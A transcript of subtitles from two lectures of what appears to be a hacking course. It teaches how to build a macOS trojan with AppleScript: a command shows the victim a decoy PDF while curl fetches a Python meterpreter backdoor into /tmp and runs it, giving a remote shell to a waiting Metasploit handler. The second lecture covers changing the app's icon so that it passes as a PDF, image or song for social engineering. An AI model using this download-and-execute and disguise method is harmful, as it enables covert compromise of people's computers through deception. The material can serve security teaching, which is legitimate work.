00:02:57,860  -->  00:03:01,520
So. I'm going to close all this and we're back to our command

37

00:03:02,200  -->  00:03:07,840
and we're going to use the -O to store the file in temp like we did with the PDF

38

00:03:08,480  -->  00:03:13,180
and that's our download command done, so it's exactly the same command that we used before,

39

00:03:13,180  -->  00:03:19,500
we're just doing cURL followed by the link that we want to download followed by -O to save it in 'tmp'.

40

00:03:19,740  -->  00:03:22,840
So, it's exactly the same curl command that we used

41

00:03:22,840  -->  00:03:25,580
when we were downloading the PDF in the previous lecture.

42

00:03:27,200  -->  00:03:32,880
Now that we have the file downloaded, we're gonna do and, and we want to run the file.

43

00:03:33,200  -->  00:03:39,200
Now, in the previous lecture, we use the open command so that the target person sees the PDF

44

00:03:39,300  -->  00:03:41,700
or the song or the file that they're expecting.

45

00:03:41,940  -->  00:03:46,080
At the moment, we want to run the file in the background

46

00:03:46,080  -->  00:03:51,451
and we've seen in the lecture when we created this backdoor to run this file we have to do Python

47

00:03:51,460  -->  00:03:57,360
followed by the file name and the file name is called rev_tcp_4444.py.

48

00:03:58,220  -->  00:04:01,500
And that's it we have a download and execute payload.

49

00:04:02,140  -->  00:04:05,460
I didn't want to give you this ready because I think it's very simple

50

00:04:05,460  -->  00:04:08,460
and it's very good for you to understand how this works

51

00:04:08,700  -->  00:04:11,820
because you'll be able to adapt it to different situations.

52

00:04:12,520  -->  00:04:17,440
So, what we have here is the first three commands we explain these in the previous lecture

53

00:04:17,740  -->  00:04:22,460
and what they're gonna do is they're gonna go into temp, then they're gonna download a file

54

00:04:22,460  -->  00:04:26,180
that the target is expecting and in this example we're downloading a PDF

55

00:04:26,540  -->  00:04:30,900
and then it's going to open that file that we downloaded using the open command,

56

00:04:31,560  -->  00:04:34,300
then in this lecture we added a comma

57

00:04:35,020  -->  00:04:38,740
and then we use the curl command again to download our backdoor

58

00:04:39,620  -->  00:04:44,680
and then we're gonna run our backdoor using Python followed by the file name

59

00:04:44,680  -->  00:04:49,620
and that's exactly the same way that we run it when we created the backdoor and were testing it.

60

00:04:50,560  -->  00:04:55,960
So I'm ready now and before I click on the play button, you want to go here to Kali

61

00:04:56,260  -->  00:05:00,580
and I want to show you that I'm already listening for incoming connections

62

00:05:00,580  -->  00:05:05,420
and we covered this multiple times and I covered this in the lecture where I created this backdoor.

63

00:05:05,580  -->  00:05:08,420
So if you don't remember how to do that, please go back to the lecture

64

00:05:08,420  -->  00:05:13,280
where I created this meterpreter Python backdoor and see how I listen for connections.

65

00:05:13,680  -->  00:05:18,280
So I already just did show options to show you that I'm using exploit multi handler

66

00:05:19,060  -->  00:05:25,710
and you can see that I set my payload to meterpreter/tcp and you can see that I've already done exploit

67

00:05:25,710  -->  00:05:27,840
and I'm listening for incoming connections.

68

00:05:28,640  -->  00:05:33,340
So I'm gonna come here, I'm gonna press on the play button to execute this code and test it.

69

00:05:35,340  -->  00:05:40,480
And as you can see I get my PDF or the file that the target person is expecting.

70

00:05:41,100  -->  00:05:47,560
If we go to the Linux machine, you'll see that I got a connection from the Mac computer

71

00:05:47,780  -->  00:05:51,900
and I managed to hack it, so just to confirm I'm gonna do 'sysinfo'

72

00:05:53,100  -->  00:05:56,460
and as you can see I'm inside the Mac computer

73

00:05:56,580  -->  00:06:00,760
and I managed to hack it using a download and execute payload,

74

00:06:00,760  -->  00:06:05,940
which we used to generate a Trojan that functions like a normal PDF

75

00:06:06,200  -->  00:06:09,240
while at the same time it will run our backdoor.

76

00:06:09,420  -->  00:06:14,000
Now like I said the download and execute payload is really handy because we can use it

77

00:06:14,000  -->  00:06:18,740
to download and execute any file in the background and then and at the same time

78

00:06:18,740  -->  00:06:23,220
the target will see a file that they expect like an image or a song or a program

79

00:06:23,220  -->  00:06:26,100
or anything that you want a social engineer them to open.

80

00:06:27,160  -->  00:06:32,420
Now in the  next lectures, I'm going to show you how to compile 'applescripts' to apps, change their icon

81

00:06:32,420  -->  00:06:36,280
and make them look like the file that we were pretending to sent to the target person.

82

00:06:36,340  -->  00:06:39,400
So make them look like a PDF or a song or whatever.

83

00:06:40,060  -->  00:06:42,900
These steps that I'm going to show you will work with all 'applescripts'.

84

00:06:43,120  -->  00:06:46,000
So they'll work with the download and execute payload

85

00:06:46,000  -->  00:06:49,240
and they'll work with the method I showed you in the previous lecture.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,230 --> 00:00:06,590
In the previous lectures, we seen how to use AppleScript code to hack into a mac OS x machine.

2
00:00:07,360 --> 00:00:13,630
In this lecture, I'm going to show you how to compile this code, how to change its icon and make it

3
00:00:13,630 --> 00:00:16,600
look like a file that the target person is expecting.

4
00:00:17,050 --> 00:00:22,510
All the steps that I'm going to do now and in the next lecture, work with all Apple scripts.

5
00:00:22,510 --> 00:00:28,840
So they'll work with the download and execute payload, and they'll work with the Trojan that we created

6
00:00:28,840 --> 00:00:29,860
with Empire.

7
00:00:30,950 --> 00:00:31,700
Previously.

8
00:00:31,700 --> 00:00:38,480
When we did this with windows, we only used an icon for windows for a PDF, and that was sufficient

9
00:00:38,480 --> 00:00:39,830
with Mac OS.

10
00:00:39,860 --> 00:00:47,540
You can see that with PDF files, it actually shows a preview of the content of the file so it doesn't

11
00:00:47,540 --> 00:00:48,710
use one icon.

12
00:00:48,710 --> 00:00:52,520
The icon will actually change depending on the PDF file.

13
00:00:52,880 --> 00:00:54,650
So I have the PDF in here.

14
00:00:55,010 --> 00:01:05,480
And what I did is I zoomed in into the file manager, I took a screenshot, I opened it with --,

15
00:01:05,480 --> 00:01:12,020
and then I cropped the screen to the icon that the default file would have.

16
00:01:12,020 --> 00:01:13,310
And this is what I got.

17
00:01:13,310 --> 00:01:19,100
I got a png that has the icon that the preview of the content of the file.

18
00:01:20,240 --> 00:01:25,760
So this would take you some time if you're using a file as a PDF, because you want to make it look

19
00:01:25,760 --> 00:01:28,730
exactly the same as other PDFs on the system.

20
00:01:28,730 --> 00:01:32,330
If you're sending a file as an image, then the job is easy.

21
00:01:32,330 --> 00:01:37,430
You can just use this online service to convert your image to an icon.

22
00:01:37,430 --> 00:01:42,080
Or if it's an MP3, then you can just download an MP3 icon and use that.

23
